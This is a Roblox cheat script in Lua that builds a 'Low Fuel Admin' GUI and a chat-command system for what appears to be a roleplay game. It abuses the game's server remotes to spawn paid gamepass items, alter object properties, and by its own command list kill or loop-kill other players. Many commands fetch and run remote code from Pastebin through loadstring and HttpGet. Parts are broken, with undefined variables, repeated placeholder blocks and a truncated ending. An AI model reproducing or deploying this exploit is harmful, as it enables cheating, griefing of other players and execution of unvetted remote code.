-- GUI Made By Daniel
local DeadlyAdmin = Instance.new("ScreenGui")
local CheckPlayer = Instance.new("Frame")
local whitelist = Instance.new("TextLabel")
local Status = Instance.new("TextLabel")
local scanning = Instance.new("TextLabel")
local MainGUI = Instance.new("Frame")
local welcome = Instance.new("TextLabel")
local X = Instance.new("TextButton")
local jailbreak = Instance.new("TextButton")
local LowAdmin = Instance.new("TextButton")
local randomscript = Instance.new("TextButton")
local gamegui = Instance.new("TextButton")
local randomscript2 = Instance.new("TextButton")
local randomscript_2 = Instance.new("TextButton")
local randomscript5 = Instance.new("TextButton")
local randomscript3 = Instance.new("TextButton")
local randomscript6 = Instance.new("TextButton")
local randomscript4 = Instance.new("TextButton")
local promote = Instance.new("TextLabel")
local OpenGUI = Instance.new("Frame")
local OPEN = Instance.new("TextButton")

--Properties:

DeadlyAdmin.Name = "DeadlyAdmin"
DeadlyAdmin.Parent = game.CoreGui

CheckPlayer.Name = "CheckPlayer"
CheckPlayer.Parent = DeadlyAdmin
CheckPlayer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CheckPlayer.BorderColor3 = Color3.fromRGB(255, 0, 0)
CheckPlayer.Position = UDim2.new(0.682812452, 0, 0.244471759, 0)
CheckPlayer.Size = UDim2.new(0, 423, 0, 416)
CheckPlayer.Active = true
CheckPlayer.Draggable = true

whitelist.Name = "whitelist"
whitelist.Parent = CheckPlayer
whitelist.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
whitelist.BorderColor3 = Color3.fromRGB(0, 0, 255)
whitelist.Size = UDim2.new(0, 423, 0, 50)
whitelist.Font = Enum.Font.SourceSans
whitelist.Text = "Whitelist"
whitelist.TextColor3 = Color3.fromRGB(255, 255, 255)
whitelist.TextScaled = true
whitelist.TextSize = 14.000
whitelist.TextStrokeColor3 = Color3.fromRGB(217, 0, 255)
whitelist.TextStrokeTransparency = 0.000
whitelist.TextWrapped = true

Status.Name = "Status"
Status.Parent = CheckPlayer
Status.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Status.BackgroundTransparency = 1.000
Status.Position = UDim2.new(0.0543735214, 0, 0.185096145, 0)
Status.Size = UDim2.new(0, 376, 0, 240)
Status.Font = Enum.Font.SourceSans
Status.Text = "Please be patient while we scan if you are whitelisted"
Status.TextColor3 = Color3.fromRGB(0, 0, 255)
Status.TextSize = 55.000
Status.TextWrapped = true

scanning.Name = "scanning"
scanning.Parent = CheckPlayer
scanning.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
scanning.BackgroundTransparency = 1.000
scanning.Position = UDim2.new(0, 0, 0.725961566, 0)
scanning.Size = UDim2.new(0, 423, 0, 114)
scanning.Font = Enum.Font.SourceSans
scanning.Text = "By YandZ#8406 | lowkey#6429"
scanning.TextColor3 = Color3.fromRGB(170, 0, 255)
scanning.TextSize = 40.000
scanning.TextWrapped = true

MainGUI.Name = "MainGUI"
MainGUI.Parent = DeadlyAdmin
MainGUI.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGUI.BorderColor3 = Color3.fromRGB(255, 0, 255)
MainGUI.Position = UDim2.new(0.693, 0,0.272, 0)
MainGUI.Size = UDim2.new(0, 423, 0, 416)
MainGUI.Visible = false
MainGUI.Active = true
MainGUI.Draggable = true

welcome.Name = "welcome"
welcome.Parent = MainGUI
welcome.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
welcome.BorderColor3 = Color3.fromRGB(0, 255, 255)
welcome.Size = UDim2.new(0, 365, 0, 50)
welcome.Font = Enum.Font.SourceSans
welcome.Text = "Welcome To Low Fuel GUI"
welcome.TextColor3 = Color3.fromRGB(0, 0, 0)
welcome.TextSize = 30.000
welcome.TextStrokeColor3 = Color3.fromRGB(255, 255, 0)
welcome.TextStrokeTransparency = 0.000
welcome.TextWrapped = true

X.Name = "X"
X.Parent = MainGUI
X.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
X.BorderColor3 = Color3.fromRGB(255, 0, 255)
X.Position = UDim2.new(0.862884164, 0, 0, 0)
X.Size = UDim2.new(0, 58, 0, 50)
X.Font = Enum.Font.SourceSans
X.Text = "X"
X.TextColor3 = Color3.fromRGB(255, 0, 0)
X.TextScaled = true
X.TextSize = 14.000
X.TextWrapped = true
X.MouseButton1Click:connect(function()
	MainGUI.Visible = false
	OpenGUI.Visible = true
end)

jailbreak.Name = "jailbreak"
jailbreak.Parent = MainGUI
jailbreak.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
jailbreak.BackgroundTransparency = 1.000
jailbreak.BorderColor3 = Color3.fromRGB(63, 255, 34)
jailbreak.Position = UDim2.new(0.0638298541, 0, 0.365384579, 0)
jailbreak.Size = UDim2.new(0, 159, 0, 32)
jailbreak.Font = Enum.Font.SourceSans
jailbreak.Text = "Jail Break"
jailbreak.TextColor3 = Color3.fromRGB(0, 0, 0)
jailbreak.TextScaled = true
jailbreak.TextSize = 14.000
jailbreak.TextStrokeColor3 = Color3.fromRGB(255, 0, 255)
jailbreak.TextStrokeTransparency = 0.000
jailbreak.TextWrapped = true
jailbreak.MouseButton1Click:connect(function()
	-- script goes here
end)

LowAdmin.Name = "LowAdmin"
LowAdmin.Parent = MainGUI
LowAdmin.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
LowAdmin.BackgroundTransparency = 1.000
LowAdmin.BorderColor3 = Color3.fromRGB(255, 0, 0)
LowAdmin.Position = UDim2.new(0.0638297871, 0, 0.206730768, 0)
LowAdmin.Size = UDim2.new(0, 159, 0, 32)
LowAdmin.Font = Enum.Font.SourceSans
LowAdmin.Text = "Low Fuel Admin"
LowAdmin.TextColor3 = Color3.fromRGB(0, 0, 0)
LowAdmin.TextScaled = true
LowAdmin.TextSize = 14.000
LowAdmin.TextStrokeColor3 = Color3.fromRGB(255, 0, 255)
LowAdmin.TextStrokeTransparency = 0.000
LowAdmin.TextWrapped = true
LowAdmin.MouseButton1Click:connect(function()
	IDFORSPAWNER = 7671476 --Change this to one of your own gamepass.
game.Workspace.GiveTool:FireServer(IDFORSPAWNER, "SuperFlyGoldBoombox")
game.Workspace.GiveTool:FireServer(IDFORSPAWNER, "PompousTheCloud")
game:GetService("StarterGui"):SetCore("SendNotification", {
  Title = "Low Fuel Admin",
  Text = "Hello",
  Icon = "rbxassetid://4597682485"})
game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
    if msg:lower() == "^cmds" then
		print[[--
------------- Admin By lowkey#6429 & Daniel ------------------------- 

-- Commands in F9 if not say ^cmds then F9       

_________________
|Mesh Commands|
-----------------
     
^bhammer --Ban Hammer that swing kills
^plane -- huge ass plan
^bbat --Baseball Bat that swing kills
^dom   --dominus that shoots
^ambulance -- wee oo wee oo wee oo  {only use it for an emergency}
^ak -- ak 44
^scar -- TRXSH GANG scar
^rose -- rose with pink smoke
^castle -- Princess Peach Castle
^badnoob -- awful noob
^LMG -- large machine gun
^light machine -- ssg 37 machine gun
^sb gun -- sub machine gun
^spistol -- shrek pistol
^dagger -- swings
^scythe -- you can tell by the name
^noob   -- gives you a giant noob
^night sky -- gives you a huge box with a night with stars background
^bigbird --- this don't need a des ur already know by its name
^couch -- a huge couch
^acp -- ACP car- use R6 

{More Coming Soon!}
_________________
|Server Commands|
-----------------

^server -- spawns a huge baseplate
^inf -- spawns a fucking huge ass baseplate
^box -- gives you a loud boombox that plays music in the background
^tag -- requires vip tag [gives you a tag saying "LowKey-Was-Here"
^goto {plr} -- teleports you to player
^load --makes your loading rp name 
^head -- removes your head
^stroller -- gives you stroller
^code -- puts Discord server code in leaderboard
^cloud --gives cloud
^infyl -- INF Yield admin
^invis --makes your whole body invincible
^vis -- makes your character visible
^ff -- turns your body parts into forcefield parts
^pm -- chat spy
re -- resets your character
^rj -- rejoins the game
^lkill {plr} -- loop kills a player [to stop just reset]
^kill {plr} -- kills a player

_________________
|Face Commands|
-----------------

^eyes -- rainbow eyes
^rage -- beast mode rage
^smile -- Monster Smile Faces

_________________
|Morph Commands|
-----------------

^red striker -- morphs you into a Red Horn Striker {Still Working on it}

_________________
|Color Commands|
-----------------

^rb -- turns your body rainbow
^unrb -- removes rainbow body
^black --turns your character black
^white --turns your character white
^red --turns your character red  
^orange -- turns your character orange
^green -- turns your character green 
^blue -- turns your character blue 
^purple -- turns your character purple
]]
    end
    if msg:lower() == "^bigbird" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/wKpufj5P"))()
    end
    if msg:lower() == "^plane" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/mzwCNEnv"))()
    end
    if msg:lower() == "^sit" then lplayer.Character.Humanoid.Sit=true end
    if msg:lower() == "^scythe" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/aTxu6tYF"))()
    end
        if msg:lower() == "^night sky" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/GXeJR5yN"))()
    end
    if msg:lower() == "^cloud" then--add cmd inside " "
    game.Workspace.GiveTool:FireServer(7671476, "PompousTheCloud")
    end
    if msg:lower() == "^sb gun" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/d21axhA2"))()
    end
    if msg:lower() == "^spistol" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/Vrh1th0F"))()
    end
    if msg:lower() == "^iPhone 8" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/TSLtytna"))()
    end
    if msg:lower() == "^dagger" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/Ehp6Tt93"))()
    end
    if msg:lower() == "^ak" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/2zJ3TaxL"))()
    end
    if msg:lower() == "^LMG" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/Eu8PxKeF"))()
    end
    if msg:lower() == "^box" then
    local ME = game:GetService("Players").LocalPlayer
function FireEvent(ItemName, Object, Property, Value)
  ME.Character:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
end
game.Workspace.GiveTool:FireServer(7671476, "PompousTheCloud")
ME["Backpack"]:WaitForChild("PompousTheCloud").Parent = ME.Character
ME["Backpack"]:WaitForChild("SuperFlyGoldBoombox").Parent = ME.Character
FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"],"CanBeDropped",true)
FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"],"TextureId","rbxassetid://4521889469")
FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["Mesh"],"MeshId","rbxassetid://4526662969")
FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["Mesh"],"TextureId","rbxassetid://4526663033")
FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["Mesh"],"Scale",Vector3.new(.5,.5,.5))
FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"],"GripPos",Vector3.new(0.2, -0.2, 0.2))
FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"],"GripUp",Vector3.new(-0.027, 1.996, -0.089))
FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"],"GripRight",Vector3.new(1, -0.026, 0))
FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"EmitterSize","99999")
FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"MaxDistance","99999")
FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"Volume","10")
FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"PlaybackLoudness","99999")
FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"],"ToolTip","Loud Box")
FireEvent("PompousTheCloud",ME.Character["PompousTheCloud"]["Handle"],"Transparency","1")
while wait() do 
print("Made By Daniel")
FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"EmitterSize","99999")
FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"MaxDistance","99999")
wait(0.01)
FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"Volume","10")
FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"PlaybackLoudness","99999")
end
end
    if msg:lower() == "^light machine" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/EhFhTT1z"))()
    end
    if msg:lower() == "^code" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/UrBHqL9U"))()
    end
    if msg:lower() == "^server" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/JpvdBzYQ"))()
    end
    if msg:lower() == "^rose" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/gCrVgxhB"))()
    end
    if msg:lower() == "^scar" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/as4kmRwN"))()
    end
    if msg:lower() == "^castle" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/NJsGPZC7"))()
    end
    if msg:lower() == "^ss" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/ss"))()
    end
    if msg:lower() == "^ss" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/ss"))()
    end
    if msg:lower() == "^ss" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/ss"))()
    end
    if msg:lower() == "^ss" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/ss"))()
    end
    if msg:lower() == "^ss" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/ss"))()
    end
    if msg:lower() == "^red striker" then
    workspace.Face:FireServer("http://www.roblox.com/asset/?id=1009612612")wait()local C=game:GetService('Players').LocalPlayer.Name;local D={}local E={workspace=game:GetService("Workspace"),players=game:GetService("Players")}local F,G=E.players.LocalPlayer,E.workspace:FindFirstChild(C)function D:FireEvent(H,I,J,K)G:FindFirstChild(H)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=K,["Property"]=J,["Object"]=I})end;game.Workspace.GiveTool:FireServer(a,"PompousTheCloud")F["Backpack"]:WaitForChild("PompousTheCloud").Parent=G;for f,g in pairs(lplayer.Character:GetChildren())do if g:IsA("Accessory")or g:IsA("Hat")then D:FireEvent("PompousTheCloud",game.Players.LocalPlayer.Character[g.Name].Handle,"Transparency",0)end end;D:FireEvent("PompousTheCloud",G["Ultra-Fabulous Hair"]["Handle"],"Transparency",0)D:FireEvent("PompousTheCloud",G["Ultra-Fabulous Hair"]["Handle"]["Mesh"],"TextureId","rbxassetid://4611421852")D:FireEvent("PompousTheCloud",G["Ultra-Fabulous Hair"]["Handle"]["Mesh"],"MeshId","rbxassetid://453119316")D:FireEvent("PompousTheCloud",G["Ultra-Fabulous Hair"]["Handle"]["Mesh"],"Scale",Vector3.new(.0045,.0045,.0045
))D:FireEvent("PompousTheCloud",G["Ultra-Fabulous Hair"]["Handle"]["Mesh"],"Offset",Vector3.new(0,0,.45))D:FireEvent("PompousTheCloud",G["Head"]["NametagTemplate"]["TagText"],"LineHeight",(25))D:FireEvent("PompousTheCloud",G["Head"]["NametagTemplate"],"Size",UDim2.new(15,10,15,10))D:FireEvent("PompousTheCloud",G["Head"]["NametagTemplate"]["TagText"],"Text","Red Striker")D:FireEvent("PompousTheCloud",G["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.fromRGB(255, 0, 0))D:FireEvent("PompousTheCloud",G["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.fromRGB(0,0,0))D:FireEvent("PompousTheCloud",G["Shirt"],"ShirtTemplate","rbxassetid://4605137060")D:FireEvent("PompousTheCloud",G["Pants"],"PantsTemplate","rbxassetid://4589023957")game.Players.LocalPlayer.Character.PompousTheCloud:Remove()game.workspace.GiveTool:FireServer(a,"PompousTheCloud")end
    if msg:lower() == "^rage" then
        while wait() do
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=1392104198")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=741260810")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=400818835")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=606495374")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=2628286951")
            wait()
        end
    end
if msg:lower() == "^smile" then
        while wait() do
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=4630050425")
            wait(.5)
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=4628876069")
            wait(.5)
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=4628876274")
            wait(.5)
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=4628876688")
            wait(.5)
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=4630049762")
            wait(.5)
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=4630050024")
            wait(.5)
        end
    end
    if msg:lower() == "^eyes" then
        while wait() do
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235875854")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235876174")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235876570")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235877044")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235877318")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235878653")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235878884")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235879197")
        end
    end
    if msg:lower() == "^tag" then
local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
    workspace = game:GetService("Workspace"),
    players = game:GetService("Players")
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT
 
 
function CE:FireEvent(ItemName, Object, Property, Value) -- Don't Change the 'Value'
    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
end
 
C.workspace.Buy:FireServer(0, "PompousTheCloud") -- Change to your Object
        
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
while wait() do
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Font","SciFi")
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"LineHeight",(25))
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"Size",UDim2.new(15,10,15,10))
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","LowKey-Was-Here")
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(255, 0, 0))
    wait(0.00000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(255, 176, 0))
    wait(0.0000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(255, 255, 0))
    wait(0.0000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(0, 255, 0))
    wait(0.00000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(0, 0, 255))
    wait(0.0000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(0,255,255))
    wait(0.00000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(98, 37, 209))
    wait(0.0000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(146, 57, 120))
    wait(0.00000000001)
   end
end
if msg:lower()=="^rb"then _G.rainbow=true;while _G.rainbow do for f=0,1,0.1 do game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new(Color3.fromHSV(f,1,1)))wait(.1) end end end;
    if msg:lower() == "^creepypasta" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/XRUxRUSL"))()
    end
if msg:lower()=="^unrb"then _G.rainbow=false;wait(1)game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Nougat"))end;
game:GetService("UserInputService").JumpRequest:connect(function()
	if InfiniteJumpEnabled then
		game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
	end
end)
    if msg:lower() == "'^nfj" then
	    InfiniteJumpEnabled = true
    end
    if msg:lower() == "^uninfj" then
	    InfiniteJumpEnabled = false
    end
    if msg:lower() == "^stroller" then
	game.Workspace.GiveTool:FireServer("IDFORSPAWNER", "Stroller")
    end
    if msg:lower() == "^bhammer" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/mm9zbpq2"))()
    end
	if msg:lower() == "^boombox" then
		game.workspace.GiveTool:FireServer("7701149", "SuperFlyGoldBoombox")
		
	end
	if msg:lower() == "^anchor" then
	if game:GetService("Players").LocalPlayer.Character then
		for _, part in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
			pcall(function()
				part.Anchored = true
			end)
		end
	end
end
if msg:lower() == "^unanchor" then
	if game:GetService("Players").LocalPlayer.Character then
		for _, part in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
			pcall(function()
				part.Anchored = false
			end)
		end
	end
end
        if msg:lower() == "^rnametag" then
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud") -- YOUR GAMEPASS


local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = ""-- NAME THE TOOL IF WANT 
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT


function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT

MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW -- DON'T EDIT
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","")
    end
    if msg:lower() == "^vis" then
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud") -- YOUR GAMEPASS


local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT 
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT


function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT

MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW -- DON'T EDIT
CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Transparency","0")
CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Transparency","0")
CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Transparency","0")
CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Transparency","0")
CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Transparency","0")
CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Transparency","0")
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["face"]:Remove())
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","")
    end
    if msg:lower() == "^black" then
		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Really black"))
	end
    if msg:lower() == "^white" then
		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("White"))
	end
    if msg:lower() == "^red" then
		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Really red"))
	end
    if msg:lower() == "^orange" then
		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Deep orange"))
	end
    if msg:lower() == "^green" then
		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Lime green"))
	end
    if msg:lower() == "^blue" then
		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Really blue"))
	end
    if msg:lower() == "^purple" then
		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Magenta"))
	end
    if msg:lower() == "^tan" then
		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Nougat"))
	end
    if msg:lower() == "^invis" then
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud") -- YOUR GAMEPASS


local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT 
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT


function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT

MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW -- DON'T EDIT
CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["face"]:Remove())
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","")
    end
    if msg:lower() == "^torso" then
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud") -- YOUR GAMEPASS


local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT 
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT


function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT

